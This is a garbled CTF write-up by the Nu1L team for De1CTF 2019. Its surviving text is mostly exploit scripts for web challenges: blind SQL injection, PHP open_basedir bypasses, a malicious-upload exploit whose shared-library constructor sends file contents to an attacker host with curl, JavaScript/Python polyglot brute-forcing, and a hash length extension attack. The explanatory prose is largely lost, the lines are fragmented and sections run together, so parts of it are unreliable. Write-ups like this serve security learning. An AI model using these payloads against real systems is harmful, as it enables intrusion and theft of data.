De1CTF 2019 WP
Author:Nu1L Team
Team Page:https://nu1l-ctf.com
De1CTF 2019 WP
Web
Giftbox
cloudmusic_rev
9calc
ssrf
ShellShellShell
Re
Evil_boost
Signal vm
Re_Sign
Cplusplus
Pwn
A+B Judge
Weapon
Mimic_note
Crypto
xorz
babyrsa
Misc
Upgrade
Mine Sweeping
Web
Giftbox
import pyotp
import requests
import string
url = "http://222.85.25.41:8090/shell.php"
session = requests.session()
def req(cmd):
    command = {"a": cmd, "totp": pyotp.TOTP('GAXG24JTMZXGKZBU', interval=5, 
digits=8).now()}
    res = session.get(url, params = command)
 hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}
PHP, PHP,
    return res
def blind_len(query):
    for i in range(1, 100):
        cmd = "login admin'/**/and/**/length(("+query+"))>{}# admin".format(i)
        result = req(cmd)
        if b'user' in result.content:
            return i-1
def blind_get(query):
    length = blind_len(query)
    print(length)
    result = ''
    for i in range(1, length+2):
        for c in string.printable:
            cmd = "login admin'/**/and/**/ord(mid(("+query+"),{},1))={}# 
admin".format(i, ord(c))
            # print(cmd)
            resp = req(cmd)
            # print(resp)
            if b'password' in resp.content:
                result += c
                break
    print(result)
if __name__ == "__main__":
    # blind_get('select/**/database()')
    # blind_len('select/**/version()')
    # blind_get('select/**/user()')
    # 
blind_get('select/**/group_concat(schema_name)/**/from/**/information_schema.s
chemata')
    # 
blind_get("select/**/group_concat(table_name)/**/from/**/information_schema.ta
bles/**/where/**/table_schema='giftbox'")
    # 
blind_get("select/**/group_concat(column_name)/**/from/**/information_schema.c
olumns/**/where/**/table_name='users'")
    # 
blind_get("select/**/password/**/from/**/users/**/where/**/username='admin'")
    while True:
        print(req(input()).json()['message'])
targeting code position`  `code` `position
launch  PHP
destruct  
position  0-9a-zA-Z+-_(){}$  , 12, code  2
phpinfo
chdir, ini_set openbase_dir  ﬂag
eval
payload
cloudmusic_rev
https://github.com/impakho/ciscn2019_ﬁnal_web1
githubexpok0x3000x7022Z2teQgmmLQJLjD
targeting c phpinfo
targeting d ${($c)()}
launch
destruct
disabled_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifex
ited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,p
cntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signa
l_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwait
info,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_a
sync_signals,dl,exec,system,passthru,popen,proc_open,shell_exec,mail,imap_open
,imap_mail,getenv,setenv,putenv,apache_setenv,symlink,link,popepassthru,syslog
,readlink,openlog,ini_restore,ini_alter,proc_get_status,chown,chgrp,chroot,pfs
ockopen,stream_socket_server,error_log 
open_basedir=/app:/sandbox
targeting a _GET
targeting b s
targeting c {${$a}{$b}}   # php []{}
targeting d ${eval($c)}
launch
&s=chdir('/app/css');ini_set('open_basedir','..');chdir('..');chdir('..');chdi
r('..');ini_set('open_basedir','/');echo file_get_contents('/flag');
so __attribute__((constructor))  
 $version 
/flag root  suid 
import base64
import requests
import time
retry_count = 5
preset_music = 
base64.b64decode('SUQzBAAAAAABBFRSQ0sAAAADAAADMQBUSVQyAAAAEgAAA2JiYmJiYmJiYmJi
YmJiYmIAVEFMQgAAABIAAANjY2NjY2NjY2NjY2NjY2NjAFRQRTEAAAASAAADYWFhYWFhYWFhYWFhYW
FhYQA=')
site_url="http://139.180.144.87:9090"
s = requests.session()
url_login = site_url + '/hotload.php?page=login'
data_lo = {'username': 'admin666', 'password': 'admin666'}
aa=s.post(url=url_login,data=data_lo)
url = site_url + '/hotload.php?page=upload'
time.sleep(4)
data_mu = {'file_id': '7'}
music = preset_music[:0x6] + '\x00\x00\x03\x00' + preset_music[0x0a:0x53]
music += '\x00\x00\x03\x00' + '\x00\x00\x03' + 'a' * 0x70 + '\x00'
files = {'file_data': music}
res = s.post(url, data=data_mu, files=files)
print res.text
a=`/usr/bin/tac /flag`;curl http://vps:8012 -d $a
#include 
#include 
char _version[0x130];
char * version = &_version;
__attribute__ ((constructor)) void fun(){
    memset(version,0,0x130);
    FILE * fp=popen("a=`/usr/bin/tac /flag`;curl http://vps:8012 -d $a", "r");
    if (fp==NULL) return;
    fread(version, 1, 0x100, fp);
    pclose(fp);
}
9calc
zsx
import requests
import json
import string
from urllib import quote
def brute1(pos, val):
    data = """{"expression":
{"_bsontype":"Symbol","value":"1//len('''\\n;if([1,0][10000000000000001 - 
10000000000000000]){if(require('fs').readFileSync('/flag', 'utf8')[%d]=='%s')
{'1';}else{'';} }else{1;}//''') or ['1','1'][open('/flag').read()
[0]=='0']"},"isVip": true}""" % (
        pos, val)
    url = "http://45.77.242.16/calculate"
    # url = "http://127.0.0.1:3000/calculate"
    r = requests.post(url, data=data,
                      headers={'Content-Type': 'application/json'})
    return r.text
def brute2(pos, val):
    data = """{"expression":
{"_bsontype":"Symbol","value":"1//len('''\\n;if([1,0][10000000000000001 - 
10000000000000000]){if(require('fs').readFileSync('/flag', 'utf8')[0]=='0')
{'1';}else{'1';} }else{1;}//''') or ['','1'][open('/flag').read()
[%d]=='%s']"},"isVip": true}""" % (
        pos, val)
    url = "http://45.77.242.16/calculate"
    # url = "http://127.0.0.1:3000/calculate"
ssrf
    r = requests.post(url, data=data,
                      headers={'Content-Type': 'application/json'})
    return r.text
def brute3(pos, val):
    data = """{"expression":
{"_bsontype":"Symbol","value":"open('/dev/null').read()+'%s'+str(1//5) or ''' 
#\\n)//?>\\nfunction open(){return {read:()=>''}}function str(){return 0}/* 
file_get_contents('/flag')[%d].'0']);exit;}?>*///'''"},"isVip": true}""" % (
        val, pos)
    url = "http://45.77.242.16/calculate"
    # url = "http://127.0.0.1:3000/calculate"
    r = requests.post(url, data=data,
                      headers={'Content-Type': 'application/json'})
    if 'classified' in r.text:
        return 'error'
    return r.text
for i in range(0, 20):
    flag = True
    for c in string.printable:
        if ("ret" in brute1(i, c)):
            print c
            flag = False
            break
for i in range(0, 20):
    flag = True
    for c in string.printable:
        if ("ret" in brute2(i, c)):
            print c
            flag = False
            break
for i in range(0, 20):
    flag = True
    for c in string.printable:
        if ("ret" in brute3(i, c)):
            print c
            flag = False
            break
ShellShellShell
1+1
https://xz.aliyun.com/t/2148payloadshell
admin shell
https://github.com/sensepost/reGeorg
ip 172.18.0.2
import hashpumpy
import requests
import urllib.parse
def remd5(hexdigest, url):
    print(hexdigest)
    return hashpumpy.hashpump(hexdigest, 'scan', 'read', 16+len(url))
def getsign(p):
    url = 'http://139.180.128.86/geneSign'
    params = {"param": p}
    resp = requests.post(url, params = params)
    return resp.text
def req(p, sign, action):
    url = 'http://139.180.128.86/De1ta'
    params = {"param": p}
    cookies = {"sign": sign, "action": urllib.parse.quote(action)}
    resp = requests.get(url, params=params, cookies = cookies)
    return resp.text
if __name__ == "__main__":
    url = "/app/flag.txt"
    result = getsign(url)
    res = remd5(result, url)
    resp = req(url, res[0], res[1])
    print(resp)
 https://www.smi1e.top/-write-up/ web3 
system("find / -iname '*flag*'")
cat
Re
Evil_boost
--cplusplus 999 --python 777 --javascript 234
 name name11
['(', ')', '*', '-', '/']
def re4():
    signs = ['-','*','/']